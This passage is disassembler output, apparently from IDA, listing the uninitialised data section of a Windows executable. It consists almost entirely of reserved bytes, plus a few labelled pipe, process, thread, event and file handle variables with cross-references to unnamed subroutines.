                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
unk_42C0A0      db    ? ;               ; DATA XREF: sub_407940+986↑o
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
unk_42C120      db    ? ;               ; DATA XREF: sub_407940+A46↑o
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
byte_42C320     db ?                    ; DATA XREF: sub_401AE0+4C↑r
                                        ; sub_407940+AB7↑w
byte_42C321     db ?                    ; DATA XREF: sub_401AE0:loc_401BAC↑r
                                        ; sub_407940+B1A↑w
                align 4
; HANDLE hWritePipe
hWritePipe      dd ?                    ; DATA XREF: sub_4067C0+A6↑o
                                        ; sub_407040+57↑r ...
; HANDLE hReadPipe
hReadPipe       dd ?                    ; DATA XREF: sub_4067C0+AB↑o
                                        ; sub_4067C0+E3↑r ...
; HANDLE dword_42C32C
dword_42C32C    dd ?                    ; DATA XREF: sub_4067C0+CC↑o
                                        ; sub_4067C0+F0↑r ...
; HANDLE hFile
hFile           dd ?                    ; DATA XREF: sub_403630+8C↑r
                                        ; sub_403630:loc_403719↑r ...
; HANDLE hProcess
hProcess        dd ?                    ; DATA XREF: sub_4067C0+171↑w
                                        ; sub_407850↑r ...
; HANDLE dword_42C338
dword_42C338    dd ?                    ; DATA XREF: sub_403630+50↑w
                                        ; sub_403630:loc_4036A6↑r ...
; HANDLE hEvent
hEvent          dd ?                    ; DATA XREF: sub_401AE0+123↑w
                                        ; sub_401AE0+159↑r ...
; HANDLE dword_42C340
dword_42C340    dd ?                    ; DATA XREF: sub_401AE0+C7↑w
                                        ; sub_401AE0+178↑r ...
dword_42C344    dd ?                    ; DATA XREF: sub_401AE0+5F↑w
                                        ; sub_401E10+67↑r ...
dword_42C348    dd ?                    ; DATA XREF: sub_401AE0+F6↑w
                                        ; sub_401AE0+259↑r ...
dword_42C34C    dd ?                    ; DATA XREF: sub_401AE0:loc_401DAA↑r
                                        ; sub_4065E0+7D↑w
; HANDLE hHandle
hHandle         dd ?                    ; DATA XREF: sub_401AE0+13C↑w
                                        ; sub_401AE0+146↑r ...
; HANDLE hThread
hThread         dd ?                    ; DATA XREF: sub_401AE0+152↑w
                                        ; sub_401E10:loc_402696↑r ...
; HANDLE dword_42C358
dword_42C358    dd ?                    ; DATA XREF: sub_401E10:loc_402709↑r
                                        ; sub_401E10+911↑r ...
; HANDLE dword_42C35C
dword_42C35C    dd ?                    ; DATA XREF: sub_401E10+8D0↑r
                                        ; sub_401E10+8E8↑r ...
dword_42C360    dd ?                    ; DATA XREF: sub_4067C0+196↑w
dword_42C364    dd ?                    ; DATA XREF: sub_406C90+2E9↑w
dword_42C368    dd ?                    ; DATA XREF: sub_401E10+3EA↑o
                                        ; sub_401E10+405↑o ...
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
byte_42C767     db ?                    ; DATA XREF: sub_401AE0+9B↑w
byte_42C768     db ?                    ; DATA XREF: sub_403B80+10A↑o
                                        ; sub_4041F0+2B0↑o ...
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
